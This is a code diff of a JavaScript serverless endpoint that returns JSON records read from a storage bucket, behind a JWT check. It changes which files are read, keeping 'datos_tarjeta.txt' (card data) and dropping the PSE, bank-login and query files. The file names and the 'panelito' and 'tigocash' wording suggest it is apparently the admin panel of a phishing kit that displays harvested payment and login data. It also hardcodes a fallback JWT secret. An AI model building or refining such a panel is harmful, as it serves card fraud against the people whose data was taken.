@@ -14,7 +14,6 @@ const s3 = new AWS.S3({
 const BUCKET = process.env.R2_BUCKET;
 const SECRET_KEY = process.env.JWT_SECRET || 'tigocash-secret-2026-key';
 
-// Validar JWT
 function validarJWT(token) {
     try {
         const parts = token.split('.');
@@ -40,12 +39,10 @@ function validarJWT(token) {
 async function obtenerTransacciones() {
     const transacciones = [];
 
-    // Leer principalmente datos_tarjeta.txt (datos completos de transacciones)
-    const archivoPrincipal = 'datos_tarjeta.txt';
-
+    // SOLO leer de datos_tarjeta.txt (archivo principal para panelito)
     try {
         const data = await new Promise((resolve, reject) => {
-            s3.getObject({ Bucket: BUCKET, Key: archivoPrincipal }, (err, data) => {
+            s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
                 if (err) reject(err);
                 else resolve(data);
             });
@@ -57,40 +54,13 @@ async function obtenerTransacciones() {
         lineas.forEach(linea => {
             try {
                 const obj = JSON.parse(linea);
-                transacciones.push({ ...obj, tipo: 'tarjeta', archivo: archivoPrincipal });
+                transacciones.push({ ...obj, tipo: 'tarjeta' });
             } catch (e) {
-                // Ignorar líneas inválidas
+                console.error('Error parseando línea:', e);
             }
         });
     } catch (error) {
-        // Si no hay tarjetas, leer otros archivos como fallback
-        const archivosFallback = ['datos_pse.txt', 'datos_blogin.txt', 'datos_consultas.txt'];
-
-        for (const archivo of archivosFallback) {
-            try {
-                const data = await new Promise((resolve, reject) => {
-                    s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
-                        if (err) reject(err);
-                        else resolve(data);
-                    });
-                });
-
-                const contenido = data.Body.toString();
-                const lineas = contenido.split('\n').filter(l => l.trim());
-
-                lineas.forEach(linea => {
-                    try {
-                        const obj = JSON.parse(linea);
-                        const tipo = archivo.replace('datos_', '').replace('.txt', '');
-                        transacciones.push({ ...obj, tipo, archivo });
-                    } catch (e) {
-                        // Ignorar líneas inválidas
-                    }
-                });
-            } catch (error) {
-                // Continuar con siguiente archivo
-            }
-        }
+        console.error('Error leyendo datos_tarjeta.txt:', error);
     }
 
     return transacciones.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -106,7 +76,6 @@ module.exports = async (req, res) => {
     if (req.method !== 'GET') return res.status(400).json({ ok: false, error: 'GET requerido' });
 
     try {
-        // Validar token
         const authHeader = req.headers.authorization;
         const token = authHeader ? authHeader.replace('Bearer ', '') : null;
 
